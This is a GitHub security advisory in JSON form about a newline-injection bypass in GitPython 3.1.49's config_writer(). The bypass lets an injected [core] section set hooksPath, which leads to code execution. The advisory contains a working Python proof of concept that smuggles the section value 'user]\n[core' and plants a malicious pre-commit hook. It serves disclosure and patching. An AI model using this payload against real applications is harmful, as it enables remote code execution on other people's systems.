{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/247496863?v=4", "events_url": "https://api.github.com/users/aslein1413-sys/events{/privacy}", "followers_url": "https://api.github.com/users/aslein1413-sys/followers", "following_url": "https://api.github.com/users/aslein1413-sys/following{/other_user}", "gists_url": "https://api.github.com/users/aslein1413-sys/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/aslein1413-sys", "id": 247496863, "login": "aslein1413-sys", "node_id": "U_kgDODsCAnw", "organizations_url": "https://api.github.com/users/aslein1413-sys/orgs", "received_events_url": "https://api.github.com/users/aslein1413-sys/received_events", "repos_url": "https://api.github.com/users/aslein1413-sys/repos", "site_admin": false, "starred_url": "https://api.github.com/users/aslein1413-sys/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/aslein1413-sys/subscriptions", "type": "User", "url": "https://api.github.com/users/aslein1413-sys", "user_view_type": "public"}}], "cve_id": null, "cvss": {"score": 7.0, "vector_string": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 7.0, "vector_string": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-20", "name": "Improper Input Validation"}], "description": "Summary

The patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.

Details

File: git/config.py — GitPython 3.1.49 (latest patched version)

```python
  def set_value(self, section: str, option: str, value) -> "GitConfigParser":
      value_str = self._value_to_string_safe(value)   # only value is validated
      if not self.has_section(section):
          self.add_section(section)                    # section not validated
      super().set(section, option, value_str)          # option not validated
      return self
```

_write() formats section headers as "[%s]\n" % name. When section = "user]\n[core", this writes [user]\n[core]\n — two valid section headers — into .git/config.

PoC

```python
  import git, os, subprocess

  repo = git.Repo.init("/tmp/bypass_test")

  os.makedirs("/tmp/evil_hooks", exist_ok=True)
  with open("/tmp/evil_hooks/pre-commit", "w") as f:
      f.write("#!/bin/sh\nid > /tmp/rce_proof.txt\n")
  os.chmod("/tmp/evil_hooks/pre-commit", 0o755)

  # Inject newline into section parameter (not value — already patched)
  with repo.config_writer() as cw:
      cw.set_value("user]\n[core", "hooksPath", "/tmp/evil_hooks")

  r = subprocess.run(["git", "-C", "/tmp/bypass_test", "config", "core.hooksPath"],
                     capture_output=True, text=True)
  print(r.stdout.strip())  # → /tmp/evil_hooks

  subprocess.run(["git", "-C", "/tmp/bypass_test", "commit", "--allow-empty", "-m", "x"])
  print(open("/tmp/rce_proof.txt").read())  # → uid=1000(...) RCE confirmed
```

Impact

Same attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete — only value is validated while section and option remain injectable.", "ghsa_id": "GHSA-mv93-w799-cj2w", "github_reviewed_at": "2026-05-08T23:19:02Z", "html_url": "https://github.com/advisories/GHSA-mv93-w799-cj2w", "identifiers": [{"type": "GHSA", "value": "GHSA-mv93-w799-cj2w"}], "nvd_published_at": null, "published_at": "2026-05-08T23:19:02Z", "references": ["https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w", "https://github.com/advisories/GHSA-rpm5-65cw-6hj4", "https://github.com/advisories/GHSA-mv93-w799-cj2w"], "repository_advisory_url": "https://api.github.com/repos/gitpython-developers/GitPython/security-advisories/GHSA-mv93-w799-cj2w", "severity": "high", "source_code_location": "https://github.com/gitpython-developers/GitPython", "summary": "GitPython: Newline injection in config_writer() section parameter bypasses CVE-2026-42215 patch, enabling RCE via core.hooksPath", "type": "reviewed", "updated_at": "2026-05-08T23:19:59Z", "url": "https://api.github.com/advisories/GHSA-mv93-w799-cj2w", "vulnerabilities": [{"first_patched_version": "3.1.50", "package": {"ecosystem": "pip", "name": "GitPython"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 3.1.49"}], "withdrawn_at": null}

title: GitPython: Newline injection in config_writer() section parameter bypasses CVE-2026-42215 patch, enabling RCE via core.hooksPath
